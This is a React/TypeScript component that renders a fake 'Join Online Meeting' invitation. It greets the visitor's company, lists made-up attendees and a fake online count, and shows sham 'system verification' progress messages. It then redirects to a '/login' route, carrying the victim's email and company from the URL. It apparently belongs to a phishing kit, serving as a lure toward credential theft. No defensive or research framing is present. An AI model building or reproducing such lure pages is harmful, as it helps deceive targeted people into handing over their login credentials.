import { useEffect, useRef, useState } from "react";
import { FaCircle } from "react-icons/fa";
import userLogo from '/user.png'
import { useNavigate, useSearchParams } from "react-router-dom";
const words = ["Launching", "Detecting operating system", "System verification", "Connecting to meeting", "Initializing"];

const Meeting = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const company = searchParams.get('company');
  const email = searchParams.get('email');

  const [currentText, setCurrentText] = useState(words[0]);
  const [index, setIndex] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);

  const handleJoinMeeting = () => {
    setIsSubmitting(true);
  
    if (intervalRef.current) return;
  
    intervalRef.current = setInterval(() => {
      setIndex((prevIndex) => {
        const nextIndex = prevIndex + 1;
        console.log(index);
        
  
        if (nextIndex >= words.length) {
          if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
          }
  
          setCurrentText(words[words.length - 1]);
  
          setTimeout(() => {
            navigate('/login', {state: {email, company}})
          }, 500);
  
          return prevIndex;
        }
  
        setCurrentText(words[nextIndex]);
        return nextIndex;
      });
    }, 500);
  };
  

  useEffect(() => {
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, [])
  
  return (
    <div className='flex flex-col items-center justify-center w-full h-full'>
      <div className='lg:w-1/4 w-10/12 flex flex-col items-center gap-2 rounded-lg bg-white drop-shadow-2xl p-5'>
        <div className='text-[#0024f2] text-2xl text-center font-bold'>Join Online Meeting</div>
        <div className='text-gray-700 text-sm text-center'>Welcome, <span className='font-semibold'>{company}</span>. You have been invited to join a meeting</div>
        <div className='inline-flex items-center gap-2 text-gray-700 text-sm text-center relative mt-5 mb-3'>2 Users Online <FaCircle className="text-green-600"/></div>
        <div className='grid grid-cols-2 gap-3 w-full items-start'>
          <div className='flex flex-col gap-1 items-center w-full text-sm'>
            <img src={userLogo} alt='user-logo' className='border-2 border-[#0024f2] rounded-full h-15'/>
            <div className='text-black mt-2 text-center'>Mr. Richard Fred </div>
            <div className='text-gray-600 font-medium text-center'>(C.E.O)</div>
          </div>
          <div className='flex flex-col gap-1 items-center w-full text-sm'>
            <img src={userLogo} alt='user-logo' className='border-2 border-[#0024f2] rounded-full h-15'/>
            <div className='text-black mt-2 text-center'>Mrs. Angela Monika </div>
            <div className='text-gray-600 font-medium text-center'>(Intl. Marketing Manager)</div>
          </div>
        </div>
        {isSubmitting &&
          <div className='flex flex-col gap-3 w-full items-center pt-10'>
            <img src="https://cdn-icons-png.flaticon.com/512/189/189792.png" alt="Loading..." className="h-[2.5rem] w-[2.5rem] animate-spin"/>
            <div className="text-xs text-black">{currentText} ...</div>
          </div>
        }
        <div onClick={handleJoinMeeting} className='bg-[#0024f2] hover:bg-[#004bb5] hover:-translate-y-1 drop-shadow-lg hover:drop-shadow-2xl cursor-pointer w-full rounded-lg text-center py-2 font-semibold mt-5 mb-5'>JOIN</div>
        <div className='text-gray-600 text-sm text-center'>If you are unable to join the meeting, <span onClick={() => window.location.reload()} className="text-[#0024f2] cursor-pointer">click here to <span className="font-bold">Refresh</span></span>.</div>
      </div>
    </div> 
  )
}

export default Meeting
